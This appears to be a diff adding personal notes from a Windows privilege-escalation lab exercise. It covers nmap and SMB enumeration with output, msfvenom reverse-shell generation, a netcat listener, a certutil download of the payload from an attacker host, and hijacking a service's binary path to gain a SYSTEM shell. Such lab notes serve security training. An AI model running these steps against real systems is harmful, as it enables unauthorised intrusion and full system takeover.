@@ -1,0 +1,85 @@
+1-Enumeration:
+    nmap -T5 -Pn -sC -sV <IP> -oN enum/scan.log -vv
+
+        Not shown: 955 closed tcp ports (conn-refused)
+        PORT      STATE    SERVICE         REASON      VERSION
+        109/tcp   filtered pop2            no-response
+        135/tcp   open     msrpc           syn-ack     Microsoft Windows RPC
+        139/tcp   open     netbios-ssn     syn-ack     Microsoft Windows netbios-ssn
+        389/tcp   filtered ldap            no-response
+        445/tcp   open     microsoft-ds    syn-ack     Windows Server 2019 Standard Evaluation 17763 microsoft-ds
+
+        3389/tcp  open     ms-wbt-server   syn-ack     Microsoft Terminal Services
+        | rdp-ntlm-info: 
+        |   Target_Name: WIN-QBA94KB3IOF
+        |   NetBIOS_Domain_Name: WIN-QBA94KB3IOF
+        |   NetBIOS_Computer_Name: WIN-QBA94KB3IOF
+        |   DNS_Domain_Name: WIN-QBA94KB3IOF
+        |   DNS_Computer_Name: WIN-QBA94KB3IOF
+        |   Product_Version: 10.0.17763
+        |_  System_Time: 2024-01-18T00:00:07+00:00
+
+
+    SMB ENUM:
+
+        sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 <IP> -vv
+
+            PORT    STATE         SERVICE     REASON
+            139/tcp open          netbios-ssn syn-ack ttl 125
+            137/udp open|filtered netbios-ns  no-response
+
+        crackmapexec smb <IP>  -u '' -p ''
+            SMB         <IP>     445    WIN-QBA94KB3IOF  [*] Windows Server 2019 Standard Evaluation 17763 x64 (name:WIN-QBA94KB3IOF) (domain:WIN-QBA94KB3IOF) (signing:False) (SMBv1:True)
+            SMB         <IP>      445    WIN-QBA94KB3IOF  [+] WIN-QBA94KB3IOF\: 
+
+
+IF we found some credentilas + RDP:
+    remmina 
+        or 
+    xfreerdp /u:<user> /p:<password> /cert:ignore /v:<IP>
+
+        
+2-Exploit: 
+    Task 2 Generate a Reverse Shell Executable:
+
+        in Kali:
+            msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Kali IP> LPORT=<Port> -f exe -o reverse.exe
+
+            in the same directory as reverse.exe: <SMB--------- OPTIONAL --Transfer the reverse_shell via SMBServer
+                sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+
+            Test the reverse shell by setting up a netcat listener on Kali:
+                sudo nc -nvlp <Port>
+
+        in Windows:
+            certutil.exe -urlcache -f http://10.6.1.162/Desktop/Windows_PrivEsc/reverse.exe <Simple Way--------- --
+
+            If its NOT WORKING we will use SMB Server: <SMB--------- OPTIONAL
+
+                copy \\<Kali IP>\kali\reverse.exe C:\PrivEsc\reverse.exe
+
+            Then run the reverse.exe executable on Windows and catch the shell:
+
+                C:\PrivEsc\reverse.exe
+
+    Task 3 Service Exploits - Insecure Service Permissions:
+
+        Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:
+            C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
+
+        Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).
+
+        
+        Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):
+            sc qc daclsvc
+
+
+        Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:
+            sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+
+
+        Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+            net start daclsvc
+
+
+
